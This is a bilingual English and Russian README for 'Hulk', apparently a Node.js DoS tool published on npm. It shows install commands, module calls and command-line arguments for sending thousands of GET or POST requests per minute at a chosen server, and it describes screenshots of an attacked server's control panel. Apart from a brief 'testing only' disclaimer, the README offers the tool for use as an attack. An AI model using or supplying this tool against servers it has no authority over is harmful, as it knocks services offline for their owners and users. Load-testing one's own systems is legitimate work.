﻿
# Hulk v1.0.0
DoS Attack tools (for testing purposes only)

## EN

Quotation of the original file:
"This tool is a dos tool that is meant to put heavy load on HTTP servers in 
order to bring them to their knees by exhausting the resource pool, 
its is meant for research purposes only and any malicious usage of this tool is prohibited."
Originaly (python) author :  Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
	
Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko

- Dependencies
  - http
  - https
  - colors
  - url
  - fs
  
- Install:
	```
		npm install @sergdudko/hulk --save
	```
  
- Module connection (examples of using):
  - hulk.core - basic function of the module
	```
		var hulkCore = require('@sergdudko/hulk').core;
		hulkCore('http://link.com ', '', 'GET', 20, 100, log);
	```
  - hulk.cli - function for working with the console (takes the arguments of the process for stdin and outputs stdout in console.log)
	```
		var hulkCli = require('@sergdudko/hulk').cli;
		hulkCli();
		
		node you_script.js http://link.com dsdsdsds POST 100 1000
	```
  - hulk.file - function for working with the log file
	```
		var hulkFile = require('@sergdudko/hulk').file;
		hulkFile('http://link.com', '', 'GET', 20, 100, __dirname + '/test.log');
	```
  - hulk.func - function for working with callback function (return the output array of the console to callback)
	```
		var hulkFunc = require('@sergdudko/hulk').func;
		hulkFunc('http://link.com', '', 'GET', 20, 100, console.log);
	```
  
- Setting (function arguments for hulk.core, hulk.file, hulk.func)
  - set_you_link - link to you server, formated "https://test.com/"
  - set_this_data - data to request (not use for GET request)
  - set_this_method - type request (GET, POST and others)
  - set_req_total - number of requests for attack
  - set_req_in_min - limit download of requests per minute
  - stdout  (for hulk.core, hulk.func) - output function (console.log or write to file)
  - path (for hulk.file) - path to the file for report output
  
- Setting (process arguments for hulk.cli)
  - Default values:
	```
	  - set_you_link - http://you_link.com/
	  - set_this_data - ''
	  - set_this_method - GET
	  - set_req_total - 20k
	  - set_req_in_min - 10k/min
	```
  - With the argument set_this_data:
	```
	  node you_script.js set_you_link set_this_data set_this_method set_req_total set_req_in_min
	  node you_script.js http://link.com dsdsdsds POST 100 1000

	  - set_you_link - http://link.com
	  - set_this_data - dsdsdsds
	  - set_this_method - POST
	  - set_req_total - 100
	  - set_req_in_min - 1000 req/min
	```
  - Without the argument set_this_data:
	```
	  node you_script.js set_you_link set_this_method set_req_total set_req_in_min
	  node you_script.js http://link.com GET 1000 1000

	  - set_you_link - http://link.com
	  - set_this_data - ''
	  - set_this_method - GET
	  - set_req_total - 1000
	  - set_req_in_min - 1000 req/min
	```
  - Using the default settings:
	```
	  node you_script.js set_you_link set_this_method set_req_total
	  node you_script.js http://link.com GET 2000

	  - set_you_link - http://link.com
	  - set_this_data - ''
	  - set_this_method - GET
	  - set_req_total - 2000
	  - set_req_in_min - 10k req/min
	```

## RU  

Софт для DoS атаки на сервер. Исключительно для тестирования собственных продуктов. 
Использование в противозаконных целях запрещено. Идея навеяна аналогичным скриптом на python(Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/).
На основании её и реализовал в javascript(nodejs). Плюшки асинхронного языка в комплекте.

- Зависимости
  - http
  - https
  - colors
  - url
  - fs
  
- Установка:
	```
		npm install @sergdudko/hulk --save
	```
  
- Подключение модуля (примеры использования):
  - hulk.core - основная функция модуля
	```
		var hulkCore = require('@sergdudko/hulk').core;
		hulkCore('http://link.com ', '', 'GET', 20, 100, log);
	```
  - hulk.cli - функция для работы с консолью (принимает аргументы процесса за stdin и выводит stdout в console.log)
	```
		var hulkCli = require('@sergdudko/hulk').cli;
		hulkCli();
		
		node you_script.js http://link.com dsdsdsds POST 100 1000
	```
  - hulk.file - функция для работы с лог-файлом
	```
		var hulkFile = require('@sergdudko/hulk').file;
		hulkFile('http://link.com', '', 'GET', 20, 100, __dirname + '/test.log');
	```
  - hulk.func - функция для работы с каллбэк-функцией (вернет массив вывода консоли в каллбэк)
	```
		var hulkFunc = require('@sergdudko/hulk').func;
		hulkFunc('http://link.com', '', 'GET', 20, 100, console.log);
	```

- Настройка (аргументы функции hulk.core, hulk.file, hulk.func)
  - set_you_link - ссылка для атаки "https://test.com/"
  - set_this_data - данные REST запроса (могут быть пустыми)
  - set_this_method - вид запроса (GET, POST и др.)
  - set_req_total - общее число запросов к серверу
  - set_req_in_min - предел скорости запросов к серверу (запросов в минуту)
  - stdout (для hulk.core, hulk.func) - функция вывода (console.log или запись в файл)
  - path (для hulk.file) - путь к файлу для вывода отчета
  
- Настройка (аргументы процесса hulk.cli)
  - Значения по умолчанию:
	```
	  - set_you_link - http://you_link.com/
	  - set_this_data - ''
	  - set_this_method - GET
	  - set_req_total - 20k
	  - set_req_in_min - 10k/min
	```
  - В случае передачи аргумента set_this_data:
	```
	  node you_script.js set_you_link set_this_data set_this_method set_req_total set_req_in_min
	  node you_script.js http://link.com dsdsdsds POST 100 1000

	  - set_you_link - http://link.com
	  - set_this_data - dsdsdsds
	  - set_this_method - POST
	  - set_req_total - 100
	  - set_req_in_min - 1000 req/min
	```
  - Без передачи аргумента set_this_data:
	```
	  node you_script.js set_you_link set_this_method set_req_total set_req_in_min
	  node you_script.js http://link.com GET 1000 1000

	  - set_you_link - http://link.com
	  - set_this_data - ''
	  - set_this_method - GET
	  - set_req_total - 1000
	  - set_req_in_min - 1000 req/min
	```
  - Используя параметры по умолчанию:
	```
	  node you_script.js set_you_link set_this_method set_req_total
	  node you_script.js http://link.com GET 2000

	  - set_you_link - http://link.com
	  - set_this_data - ''
	  - set_this_method - GET
	  - set_req_total - 2000
	  - set_req_in_min - 10k req/min
	```
  
## SCREENSHOTS

- Внешний вид атаки/Appearance of attack

![Screenshot_1](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_1.png)

- Вывод итоговой статистики/Output of summary statistics

![Screenshot_2](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_2.png)

- Вот так это выглядит в CPanel атакуемого сервера (напомню, что убить сервер цели не было - потому атаки были не продолжительны)/This is how it looks in the CPanel of the attacked server (I recall that there was no goal to kill the server - therefore, the attacks were not long)

![Screenshot_3](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_3.png)

![Screenshot_4](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_4.png)

![Screenshot_5](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_5.png)

![Screenshot_6](https://github.com/siarheidudko/hulk/raw/master/img/Screenshot_6.png)
